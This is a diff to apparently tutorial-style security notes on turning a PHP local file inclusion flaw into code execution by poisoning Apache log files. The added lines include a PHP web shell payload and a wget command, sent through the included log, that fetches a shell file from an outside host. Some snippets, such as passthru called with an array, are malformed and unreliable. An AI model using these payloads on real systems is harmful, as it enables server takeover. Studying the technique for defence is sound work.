@@ -318,7 +318,7 @@ LFI vs LFD:
 **Exploitation: PHP Log File Injection**  
 
 Steps:
-1. Identify LFI/LFD vulnerability signals.
+1. Verify existence of LFI/LFD vulnerability.
 ``` HTML
 domain.com/?p=somepage.txt
 domain.com/?p=pagename-whatever
@@ -342,12 +342,26 @@ Also check Apache logs:
 /var/log/httpd-error.log
 ```
 
-3. Inject payloads into the logfile:
+3. Send a malicious request to inject a payload into the logfile:
 
-_PHP passthru() function_
+  * _PHP passthru() function_: Execute an external program and display raw output
+  * Attack vectors:
+     * URL query string: `example.com/?q=injectpaylod`
+     * HTTP Headers: Referer header.
 ``` PHP
 <?php passthru($_GET['cmd']); ?>
+<?php passthru(['ls -l']); ?>
 ```
+
+4. With command execution, use wget to upload your own files to the server:
+``` SHELL
+/var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
+OR
+<?php passthru(['w']); ?>
+```
+
+Examples:
+* https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/
 
 **Mitigation**
 
